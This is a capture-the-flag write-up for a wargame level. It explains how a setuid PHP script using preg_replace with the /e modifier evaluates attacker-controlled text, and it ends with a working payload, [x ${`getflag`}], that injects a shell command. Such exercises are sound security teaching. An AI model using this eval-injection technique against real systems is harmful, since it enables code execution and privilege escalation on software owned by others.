# level06 - Command injection - Exploit php script

## Summary

In our `HOME` directory, we find two interesting files: `level06` and `level06.php`

```shell
~:/home/user/level06$ ls -l

total 12
-rwsr-x---+ 1 flag06 level06 7503 Aug 30  2015 level06
-rwxr-x---  1 flag06 level06  356 Mar  5  2016 level06.php
```
<br>

The first file (`level06`) is a binary, and when we see it through `hexdump`, we can see that it just execute the second file (`level06.php`) with php … but with the flag06’s **suid bit**.

```shell
~:/home/user/level06$ hexdump -C level06

...
000007d0  2e 73 6f 0a 00 2f 75 73  72 2f 62 69 6e 2f 70 68  |.so../usr/bin/ph|
000007e0  70 00 2f 68 6f 6d 65 2f  75 73 65 72 2f 6c 65 76  |p./home/user/lev|
000007f0  65 6c 30 36 2f 6c 65 76  65 6c 30 36 2e 70 68 70  |el06/level06.php|
...
```
<br>

So, it’s in the second file (`level06.php`) that the vulnerability is. the behavior of the program seems to be reading/displaying a file passed as a parameter…  but a certain regex seems to be the flaw: `/(\[x (.*)\])/e`

```shell
~:/home/user/level06$ cat level06.php

#!/usr/bin/php
<?php
	function y($m) {
		$m = preg_replace("/\./", " x ", $m);
		$m = preg_replace("/@/", " y", $m);
		return $m;
	}
	function x($y, $z) {
		$a = file_get_contents($y);
		$a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);
		$a = preg_replace("/\[/", "(", $a);
		$a = preg_replace("/\]/", ")", $a);
		return $a;
	}
	$r = x($argv[1], $argv[2]);
	print $r;
?>
```
Indeed, The ‘\e’ modifier is a **PHP-specific modifier that triggers PHP to run the resulting string as PHP code**. It is basically a `eval()` wrapped inside a regex engine. … And that is good for our exploit ! 


<br>


## Exploit

As we see above, `/(\[x (.*)\])/e` is the key ! Let’s disassemble it :

  - `(` and `)`: These parentheses are used to capture a group in the regular
     expression. Whatever matches inside these parentheses will be captured
    as a separate element.
  - `\[x` & `\]`: These parts matche the literal string `[x <something> ]`.
  - `(.*)`: This part matches any sequence of characters (except newlines)
    and captures it as a group using the parentheses. `.*` is a quantifier meaning
    "*match any character zero or more times*".
  - `/e` : The `e` modifier is a **deprecated regex** modifier which allows you
    to use PHP code within your regular expression. This means that whatever
    you parse in will be evaluated as a part of your program.

The regular expression `/(\[x (.*)\])/e` is used to match and capture strings that
start with `[x` followed by any sequence of characters and end with `]`. So, as “*any
sequence of characters*”, we will use a
[Complex (curly) Syntax](https://beamtic.com/complex-curly-syntax-php) which is 
``[x ${`getflag`}]`` !

In summary, the regular expression `/(\[x (.*)\])/e` matches the string 
``[x ${`getflag`}]``, and it would indeed execute the command `getflag` because
the backstick operator ``` `` ``` within a [Complex (curly) Syntax](https://beamtic.com/complex-curly-syntax-php) can be used
to execute directly a shell commands in php:

  ```shell
  echo '[x ${`getflag`}]' > /tmp/exploit06 && ~/level06 /tmp/exploit06
  ```

